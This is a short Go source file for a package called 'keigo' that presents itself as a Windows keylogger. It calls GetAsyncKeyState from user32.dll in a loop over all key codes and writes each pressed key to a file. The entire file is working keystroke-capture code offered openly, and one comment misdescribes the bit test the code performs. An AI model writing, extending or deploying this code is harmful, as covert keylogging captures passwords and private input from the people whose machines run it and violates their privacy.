// Package keigo implements windows keylogging functions.
package keigo

import "fmt"
import "os"
import "syscall"

// Load native windows dll
var moduser32 = syscall.NewLazyDLL("user32.dll")

// Load function from dll
var procGetAsyncKeyState = moduser32.NewProc("GetAsyncKeyState")

// KeyLog takes a file and writes the logged characters
func KeyLog(f *os.File) (err error) {
	for i := 0; i < 0xFF; i++ {
		asynch, _, _ := syscall.Syscall(procGetAsyncKeyState.Addr(), 1, uintptr(i), 0, 0)

		// If the least significant bit is set ignore it
		if asynch&0x1 == 0 {
			continue
		}

		err = keyLog(i, f)
		if err != nil {
			return err
		}
	}

	return nil
}

func keyLog(i int, file *os.File) (err error) {
	_, err = fmt.Fprintf(file, "%c", i)
	if err != nil {
		return err
	}

	return nil
}
